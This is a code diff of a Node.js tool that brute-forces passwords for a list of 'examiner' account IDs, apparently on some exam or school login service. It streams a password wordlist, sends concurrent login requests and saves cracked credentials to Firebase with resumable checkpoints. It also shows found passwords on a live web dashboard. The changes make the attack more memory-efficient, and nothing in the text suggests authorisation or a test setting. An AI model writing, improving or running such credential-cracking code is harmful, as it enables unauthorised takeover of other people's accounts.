@@ -6,6 +6,7 @@ const axios = require('axios');
 const admin = require('firebase-admin');
 const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
+const readline = require('readline');
 
 // ==================== FIREBASE ====================
 let serviceAccount;
@@ -44,12 +45,11 @@ let isPaused = false;
 let examinerIds = [];
 let totalExaminers = 0;
 let currentExaminerIndex = 0;
-let currentPasswordIndex = 0;        // within current examiner
-let passwords = [];                   // All passwords in memory
+let currentPasswordIndex = 0;        // password line number (0-based)
 let successes = new Map();            // examinerId -> password
 let speedStats = { requests: 0, startTime: null };
 
-// Reusable axios agent with keep-alive
+// Reusable axios agent
 const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: CONCURRENCY });
 const axiosInstance = axios.create({
   timeout: 3000,
@@ -58,7 +58,7 @@ const axiosInstance = axios.create({
   httpsAgent: agent
 });
 
-// ==================== LOAD DATA ====================
+// ==================== LOAD EXAMINERS ====================
 function loadExaminers() {
   const data = fs.readFileSync(EXAMINER_FILE, 'utf8');
   examinerIds = JSON.parse(data);
@@ -66,13 +66,28 @@ function loadExaminers() {
   console.log(`✅ Loaded ${totalExaminers} examiners`);
 }
 
-function loadPasswords() {
-  const content = fs.readFileSync(PASSWORD_FILE, 'utf8');
-  passwords = content.split(/\r?\n/).filter(line => line.trim().length > 0);
-  console.log(`✅ Loaded ${passwords.length} passwords (${(content.length / 1024 / 1024).toFixed(2)} MB)`);
+// ==================== PASSWORD BATCH GENERATOR (streaming) ====================
+async function* getPasswordBatches(startLine = 0, batchSize = CONCURRENCY) {
+  const fileStream = fs.createReadStream(PASSWORD_FILE);
+  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
+  let lineNo = 0;
+  let batch = [];
+  for await (const line of rl) {
+    if (lineNo < startLine) {
+      lineNo++;
+      continue;
+    }
+    batch.push(line.trim());
+    if (batch.length >= batchSize) {
+      yield batch;
+      batch = [];
+    }
+    lineNo++;
+  }
+  if (batch.length > 0) yield batch;
 }
 
-// ==================== LOGIN CHECK ====================
+// ==================== LOGIN CHECK (parallel) ====================
 async function tryLogin(examinerId, password) {
   try {
     const res = await axiosInstance.post(LOGIN_URL, {
@@ -88,45 +103,45 @@ async function tryLogin(examinerId, password) {
   }
 }
 
-// ==================== PROCESS ONE EXAMINER (BATCH CONCURRENCY) ====================
-async function processExaminer(examinerId, startPwdIdx) {
+// ==================== PROCESS ONE EXAMINER (streaming batches) ====================
+async function processExaminer(examinerId, startPwdIndex) {
   let foundPassword = null;
-  let pwdIdx = startPwdIdx;
+  let batchIndex = startPwdIndex;
+  let batchNo = 0;
   
-  while (pwdIdx < passwords.length && !foundPassword) {
-    const batch = passwords.slice(pwdIdx, pwdIdx + CONCURRENCY);
+  for await (const batch of getPasswordBatches(startPwdIndex, CONCURRENCY)) {
+    if (foundPassword) break;
     const promises = batch.map(pwd => tryLogin(examinerId, pwd));
     const results = await Promise.all(promises);
-    
     for (let i = 0; i < results.length; i++) {
       if (results[i].success) {
         foundPassword = results[i].password;
         break;
       }
     }
-    pwdIdx += batch.length;
-    currentPasswordIndex = pwdIdx;
+    batchIndex += batch.length;
+    currentPasswordIndex = batchIndex;
+    batchNo++;
     
-    // Update UI progress after each batch
+    // Update progress after every batch
     const elapsed = (Date.now() - speedStats.startTime) / 1000;
     const speed = elapsed > 0 ? Math.round(speedStats.requests / elapsed) : 0;
     io.emit('progress', {
       examinerIndex: currentExaminerIndex,
       totalExaminers,
-      passwordIndex: pwdIdx,
-      totalPasswords: passwords.length,
+      passwordIndex: batchIndex,
       currentExaminer: examinerId,
       speed
     });
     
-    // Save checkpoint after each batch (optional, every batch)
-    await saveCheckpoint();
+    // Save checkpoint every 5 batches (reduce Firebase writes)
+    if (batchNo % 5 === 0) await saveCheckpoint();
   }
   
   return { found: !!foundPassword, password: foundPassword };
 }
 
-// ==================== MAIN ATTACK LOOP ====================
+// ==================== MAIN LOOP ====================
 async function startAttack() {
   if (isRunning) return;
   isRunning = true;
@@ -137,18 +152,15 @@ async function startAttack() {
   
   for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
     const examinerId = examinerIds[idx];
-    // Check if already found (in database)
     if (successes.has(examinerId)) {
       console.log(`⏭️ Skipping ${examinerId} (already found)`);
       continue;
     }
-    
     currentExaminerIndex = idx;
     let startPwd = (idx === currentExaminerIndex) ? currentPasswordIndex : 0;
     const result = await processExaminer(examinerId, startPwd);
     
     if (result.found) {
-      // Save to Firebase
       await db.collection('successful_logins').add({
         examinerId,
         password: result.password,
@@ -184,7 +196,6 @@ async function saveCheckpoint() {
 }
 
 async function loadCheckpointAndSuccesses() {
-  // Load existing successes from Firebase
   const successSnapshot = await db.collection('successful_logins').get();
   successSnapshot.forEach(doc => {
     const data = doc.data();
@@ -192,19 +203,17 @@ async function loadCheckpointAndSuccesses() {
   });
   console.log(`📦 Loaded ${successes.size} existing successes from DB`);
   
-  // Load checkpoint
   const doc = await db.collection('checkpoint').doc('current').get();
   if (doc.exists) {
     const data = doc.data();
     currentExaminerIndex = data.examinerIndex || 0;
     currentPasswordIndex = data.passwordIndex || 0;
-    // Merge successes from checkpoint (in case of partial resume)
     if (data.successes) {
       for (const [id, pwd] of data.successes) {
         if (!successes.has(id)) successes.set(id, pwd);
       }
     }
-    console.log(`📌 Resume from examiner ${currentExaminerIndex}, password index ${currentPasswordIndex}`);
+    console.log(`📌 Resume from examiner ${currentExaminerIndex}, password line ${currentPasswordIndex}`);
   }
 }
 
@@ -215,13 +224,11 @@ app.get('/api/successes', async (req, res) => {
 });
 
 io.on('connection', (socket) => {
-  // Send initial data: total examiners, already found successes, current progress
   socket.emit('init', {
     totalExaminers,
     successes: Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd })),
     currentExaminerIndex,
     currentPasswordIndex,
-    totalPasswords: passwords.length,
     isRunning,
     isPaused
   });
@@ -243,18 +250,16 @@ io.on('connection', (socket) => {
     successes.clear();
     await saveCheckpoint();
     io.emit('status', { running: false, paused: false });
-    io.emit('init', { totalExaminers, successes: [], currentExaminerIndex: 0, currentPasswordIndex: 0, totalPasswords: passwords.length, isRunning: false, isPaused: false });
+    io.emit('init', { totalExaminers, successes: [], currentExaminerIndex: 0, currentPasswordIndex: 0, isRunning: false, isPaused: false });
   });
 });
 
 // ==================== START ====================
 loadExaminers();
-loadPasswords();
 loadCheckpointAndSuccesses().then(() => {
   server.listen(process.env.PORT || 3000, () => {
     console.log(`🔥 Server at http://localhost:${process.env.PORT || 3000}`);
-    console.log(`⚡ Concurrency: ${CONCURRENCY} passwords per batch`);
-    console.log(`📊 Total passwords: ${passwords.length}`);
-    console.log(`👥 Total examiners: ${totalExaminers}`);
+    console.log(`⚡ Batch concurrency: ${CONCURRENCY} passwords per batch`);
+    console.log(`💾 Memory safe: passwords streamed, no array storage`);
   });
 });
